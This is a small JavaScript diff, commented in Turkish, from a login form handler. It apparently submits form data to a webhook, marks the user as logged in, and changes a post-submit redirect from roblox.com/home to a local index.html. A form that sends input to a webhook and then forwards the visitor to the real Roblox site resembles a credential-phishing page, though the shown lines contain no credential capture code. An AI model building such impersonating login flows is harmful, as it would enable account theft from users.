@@ -39,9 +39,9 @@
       })
       .then(response => response.json())
       .then(() => {
-        // Başarıyla gönderildiğinde, kullanıcıyı GitHub Pages ana sayfasına yönlendirme
+        // Başarıyla gönderildiğinde, kullanıcıyı ana sayfaya yönlendirme ve login durumunu kaydetme
         localStorage.setItem('userLoggedIn', 'true');
-        window.location.href = 'https://roblox.com/home'; // Buraya istediğiniz yönlendirme URL'sini ekleyin
+        window.location.href = 'index.html'; // Giriş yaptıktan sonra ana sayfaya yönlendir
       })
       .catch(error => console.error('Webhook hatası:', error));
     });
